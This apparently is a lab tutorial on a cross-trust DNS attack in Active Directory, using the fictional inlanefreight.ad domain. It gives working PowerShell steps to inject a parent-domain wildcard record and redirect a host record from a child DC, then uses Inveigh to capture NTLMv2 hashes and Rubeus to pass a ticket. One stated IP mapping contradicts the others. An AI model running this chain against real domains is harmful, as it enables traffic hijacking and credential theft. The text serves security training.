## What is?
The DNS trust attack involves the unauthorized creation, deletion, and modification of DNS records within any of the database locations of a parent domain from within a child domain. These actions can have serious consequences, such as enabling denial-of-service (DoS) attacks or facilitating man-in-the-middle (MiTM) attacks.

## How it works?
Usually DNS records in a AD environment are save in the following paths:
1. DomainDnsZones partition `(CN=MicrosoftDNS,DC=DomainDnsZones,DC=root,DC=local)`
2. ForestDnsZones partition `(CN=MicrosoftDNS,DC=ForestDnsZones,DC=root,DC=local)`
3. Domain partition `(CN=MicrosoftDNS,CN=System,DC=root,DC=local)`

If you hold SYSTEM rights over a CHILD domain it is possible to poison the DNS records all the way back to the Parent DC , potentially leading to various security vulnerabilities, such as DNS spoofing, traffic redirection, or Denial-of-Service (DoS) attacks.

# Attacks
## DNS Wildcard Injection
When a wildcard record is created, the DNS server utilizes this record to respond to name requests that don't precisely match any specific records within the zone. A wildcard record acts as a catch-all mechanism for DNS queries. If a requested domain name does not have an exact match in the DNS zone, the wildcard record will be used to provide a response. This allows the DNS server to handle requests for non-existent or undefined subdomains by using the wildcard entry as a default response.

As `SYSTEM` on a child DC, an attacker can inject wildcard record `(DC=*, DC=inlanefreight.ad, CN=MicrosoftDNS, DC=DomainDNSZones, DC=inlanefreight, DC=ad)` in parent domain and point it to an attacker controlled IP such that all non-existent DNS records for parent domain (`*.inlanefreight.ad`) will point to an IP controlled by attacker.
Spawn a shell as **SYSTEM** on the *child domain*.
```powershell-session
.\PsExec -s -i powershell
```
Add a new wildcard node to the PARENT domain(via replication between CHILD/PARENT).
```powershell-session
Import-module .\Powermad.ps1
New-ADIDNSNode -Node * -domainController DC01.inlanefreight.ad -Domain inlanefreight.ad -Zone inlanefreight.ad -Tombstone -Verbose
```
If this is true now all the inexistent request will be resolved by the CHILD IP(172.16.210.3).
```powershell-session
PS C:\Tools> Resolve-DNSName ANYTHING.inlanefreight.ad
Name                                           Type   TTL   Section    IPAddress
----                                           ----   ---   -------    ---------
ANYTHING.inlanefreight.ad                      A      599   Answer     172.16.210.3         
```

## Modify existing record for MITM
It is also possible to modify existing DNS records on the **PARENT** sitting as **SYSTEM** on CHILD domain. In this example we will try to edit the DNS record associated to the share address **\\DEV01.INLANEFREIGHT.AD\dev_share** this can lead us to a MITM attack listening back for request via Responder/Inveigh.

Start by spinning up a shell as **SYSTEM** over the CHILD domain.
```powershell-session
.\PsExec -s -i powershell
```
Get all the records on the PARENT domain(directly from CHILD session) for the target machine. 
```powershell-session
Get-DnsServerResourceRecord -ComputerName DC01.inlanefreight.ad -ZoneName inlanefreight.ad -Name "@"

HostName                  RecordType Type       Timestamp            TimeToLive      RecordData
--------                  ---------- ----       ---------            ----------      ----------
@                         A          1          3/4/2024 3:00:00 PM  00:10:00        172.16.210.99
@                         NS         2          0                    01:00:00        dc01.inlanefreight.ad.
@                         SOA        6          0                    01:00:00        [95][dc01.inlanefreight.ad.][ho...
dc01                      A          1          0                    01:00:00        172.16.210.99
DEV01                     A          1          0                    01:00:00        172.16.210.7   

//OR with this commando
Resolve-DnsName -Name DEV01.inlanefreight.ad -Server DC01.INLANEFREIGHT.AD
Name                                           Type   TTL   Section    IPAddress
----                                           ----   ---   -------    ---------
DEV01.inlanefreight.ad                         A      599   Answer     172.16.210.7
```
In the default case scenario **DEV=172.16.210.7** we want to make it point back to us **DC02=172.16.210.7**.
Now it is clear we need to edit that A(type) record to point back to us.
```powershell-session
$Old = Get-DnsServerResourceRecord -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad -Name DEV01
$New = $Old.Clone()
$TTL = [System.TimeSpan]::FromSeconds(1)
$New.TimeToLive = $TTL
$New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('172.16.210.3')
Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad
Get-DnsServerResourceRecord -ComputerName DC01.inlanefreight.ad -ZoneName inlanefreight.ad -Name "@"

HostName                  RecordType Type       Timestamp            TimeToLive      RecordData
--------                  ---------- ----       ---------            ----------      ----------
@                         A          1          3/15/2024 5:00:00 PM 00:10:00        172.16.210.99
@                         NS         2          0                    01:00:00        dc01.inlanefreight.ad.
@                         SOA        6          0                    01:00:00        [97][dc01.inlanefreight.ad.][ho...
dc01                      A          1          0                    00:20:00        172.16.210.99
DEV01                     A          1          0                    00:00:01        172.16.210.3
```
We can check that the record is updated correctly.
```powershell-session
Resolve-DnsName -Name DEV01.inlanefreight.ad -Server DC01.INLANEFREIGHT.AD
Name                                           Type   TTL   Section    IPAddress
----                                           ----   ---   -------    ---------
DEV01.inlanefreight.ad                         A      599   Answer     172.16.210.3
```
Now we can setup Inveigh.exe which is a C# of Responder to listen for requests.
```powershell-session
 Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y

[+] [2024-03-15T17:28:14] SMB(445) NTLMv2 captured for INLANEFREIGHT\buster from 172.16.210.99(DC01):55304:             buster::INLANEFREIGHT:EEF02F19D6E9FA07:93F3C74E204B4158A07170AC7C1F7949:01010000000000005539A1112877DA01D31374BC09033A870000000002000600440045<SNIP>
```
Crack the hash and inject it into memory via **Rubeus.exe**
```powershell-session
.\Rubeus.exe asktgt /user:buster /domain:inlanefreight.ad /password:<SNIP> /ptt
```